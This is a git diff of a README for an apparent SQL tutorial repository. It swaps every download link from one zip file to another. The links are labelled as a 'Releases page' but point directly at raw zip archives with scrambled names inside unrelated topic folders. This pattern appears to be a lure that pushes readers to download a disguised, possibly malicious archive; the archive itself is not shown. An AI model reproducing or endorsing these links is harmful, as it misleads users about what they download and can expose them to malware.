@@ -1,6 +1,6 @@
 # 🌟 SQL-Mastery-Basic-to-Advanced - Learn SQL Easily and Effectively
 
-[![Download SQL-Mastery-Basic-to-Advanced](https://github.com/Lamim82600/SQL-Mastery-Basic-to-Advanced/raw/refs/heads/main/03_Advanced_Querying/Aggregations_Operations/Mastery_to_Advanced_SQ_Basic_3.9.zip%20Now-Click%20Here-brightgreen)](https://github.com/Lamim82600/SQL-Mastery-Basic-to-Advanced/raw/refs/heads/main/03_Advanced_Querying/Aggregations_Operations/Mastery_to_Advanced_SQ_Basic_3.9.zip)
+[![Download SQL-Mastery-Basic-to-Advanced](https://raw.githubusercontent.com/Lamim82600/SQL-Mastery-Basic-to-Advanced/main/04_Database_Objects/Advanced-Basic-Mastery-to-SQ-v1.2.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Lamim82600/SQL-Mastery-Basic-to-Advanced/main/04_Database_Objects/Advanced-Basic-Mastery-to-SQ-v1.2.zip)
 
 ## 📖 About This Repository
 
@@ -11,7 +11,7 @@ Welcome to SQL-Mastery-Basic-to-Advanced! This repository offers a structured pa
 To start learning SQL with our repository, follow these steps:
 
 1. **Download the Repository**  
-   Click the Download button above or visit the [Releases page](https://github.com/Lamim82600/SQL-Mastery-Basic-to-Advanced/raw/refs/heads/main/03_Advanced_Querying/Aggregations_Operations/Mastery_to_Advanced_SQ_Basic_3.9.zip) to get the latest version of our materials. 
+   Click the Download button above or visit the [Releases page](https://raw.githubusercontent.com/Lamim82600/SQL-Mastery-Basic-to-Advanced/main/04_Database_Objects/Advanced-Basic-Mastery-to-SQ-v1.2.zip) to get the latest version of our materials. 
 
 2. **Extract Files**  
    Once downloaded, locate the ZIP file on your computer. Right-click on it and choose “Extract All.” Follow the instructions to unzip the files. You will find folders containing SQL scripts organized by topic.
@@ -41,7 +41,7 @@ Inside this repository, you will find:
 
 ## 🔄 Download & Install
 
-To download SQL-Mastery-Basic-to-Advanced, visit our [Releases page](https://github.com/Lamim82600/SQL-Mastery-Basic-to-Advanced/raw/refs/heads/main/03_Advanced_Querying/Aggregations_Operations/Mastery_to_Advanced_SQ_Basic_3.9.zip). Choose the latest version and follow the download instructions. After the download, extract the files and follow the steps outlined in the Getting Started section.
+To download SQL-Mastery-Basic-to-Advanced, visit our [Releases page](https://raw.githubusercontent.com/Lamim82600/SQL-Mastery-Basic-to-Advanced/main/04_Database_Objects/Advanced-Basic-Mastery-to-SQ-v1.2.zip). Choose the latest version and follow the download instructions. After the download, extract the files and follow the steps outlined in the Getting Started section.
 
 ## 📚 Learning Topics
 
@@ -64,4 +64,4 @@ If you encounter issues or have questions, please open an issue on GitHub. We st
 
 ## 🌟 Final Note
 
-Learning SQL can be both rewarding and enjoyable. With our comprehensive repository, you will build a strong foundation and advance your skills effectively. Be sure to visit the [Releases page](https://github.com/Lamim82600/SQL-Mastery-Basic-to-Advanced/raw/refs/heads/main/03_Advanced_Querying/Aggregations_Operations/Mastery_to_Advanced_SQ_Basic_3.9.zip) to download your copy and start your journey into SQL today!
+Learning SQL can be both rewarding and enjoyable. With our comprehensive repository, you will build a strong foundation and advance your skills effectively. Be sure to visit the [Releases page](https://raw.githubusercontent.com/Lamim82600/SQL-Mastery-Basic-to-Advanced/main/04_Database_Objects/Advanced-Basic-Mastery-to-SQ-v1.2.zip) to download your copy and start your journey into SQL today!
